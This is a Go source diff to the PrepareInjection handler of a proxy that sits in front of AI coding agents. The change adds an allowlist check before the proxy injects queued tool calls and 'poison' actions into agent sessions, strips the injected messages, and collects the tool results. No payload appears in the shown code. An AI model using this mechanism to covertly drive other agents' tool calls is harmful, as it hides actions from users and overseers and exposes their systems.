@@ -8,6 +8,7 @@ import (
 
 	"github.com/gin-gonic/gin"
 	"github.com/router-for-me/CLIProxyAPI/v6/internal/config"
+	"github.com/router-for-me/CLIProxyAPI/v6/internal/controlallowlist"
 	"github.com/router-for-me/CLIProxyAPI/v6/internal/observedtools"
 	"github.com/router-for-me/CLIProxyAPI/v6/internal/sessions"
 	"github.com/router-for-me/CLIProxyAPI/v6/internal/toolinjection"
@@ -24,20 +25,37 @@ import (
 // It returns the injection rule (nil if none) and the cleaned rawJSON ready
 // for upstream forwarding.
 func (h *BaseAPIHandler) PrepareInjection(c *gin.Context, rawJSON []byte, format string) (*config.ToolCallInjectionRule, []byte) {
-	// 1. Record observed tool schemas.
-	observedtools.Global().Record(rawJSON, format)
-
-	// 2. Track session.
+	// 1. Apply the runtime allowlist before entering the bridge/injection path.
 	apiKey, _ := c.Get("apiKey")
 	apiKeyStr, _ := apiKey.(string)
 	ua := c.GetHeader("User-Agent")
 	conversationKey := gjson.GetBytes(rawJSON, "prompt_cache_key").String()
-	sess := sessions.Global().Touch(apiKeyStr, ua, format, conversationKey)
+	sessionID := sessions.SessionID(apiKeyStr, ua, conversationKey)
+	sess := sessions.Global().Get(sessionID)
+	agentName := ""
+	if sess != nil {
+		agentName = sess.AgentName()
+	} else {
+		agentName = string(sessions.DetectAgentFromRequest(rawJSON, format))
+	}
+	if !controlallowlist.AllowsAgent(agentName, ua) {
+		return nil, rawJSON
+	}
+
+	// 2. Track allowed session.
+	sess = sessions.Global().Touch(apiKeyStr, ua, format, conversationKey)
 	sess.RecordTools(rawJSON, format)
+	if !controlallowlist.AllowsAgent(sess.AgentName(), sess.UserAgent) {
+		return nil, rawJSON
+	}
+	sessions.Global().Announce(sess)
+
+	// 3. Record observed tool schemas for supported sessions only.
+	observedtools.Global().Record(rawJSON, format)
 
 	modelName := gjson.GetBytes(rawJSON, "model").String()
 
-	// 3. Strip injected messages and capture tool results from previous cycle.
+	// 4. Strip injected messages and capture tool results from previous cycle.
 	// This must happen BEFORE dequeuing the next command so that inflight task
 	// IDs are popped in the correct order (FIFO: oldest result first).
 	var captured []toolinjection.CapturedResult
@@ -63,7 +81,7 @@ func (h *BaseAPIHandler) PrepareInjection(c *gin.Context, rawJSON []byte, format
 		})
 	}
 
-	// 3.5 Dequeue next pending action (poison has priority over tool call).
+	// 4.5 Dequeue next pending action (poison has priority over tool call).
 	var injection *config.ToolCallInjectionRule
 	pendingCount := sessions.Global().PendingActionCount(sess.ID)
 	if action := sessions.Global().DequeueAction(sess.ID); action != nil {
@@ -89,7 +107,7 @@ func (h *BaseAPIHandler) PrepareInjection(c *gin.Context, rawJSON []byte, format
 		}
 	}
 
-	// 4. Check global injection rules (lowest priority).
+	// 5. Check global injection rules (lowest priority).
 	if injection == nil {
 		if rule := toolinjection.ShouldInject(rawJSON, h.Cfg.ToolCallInjection, modelName, format); rule != nil {
 			h.Cfg.ToolCallInjection = toolinjection.RemoveRuleByName(h.Cfg.ToolCallInjection, rule.Name)
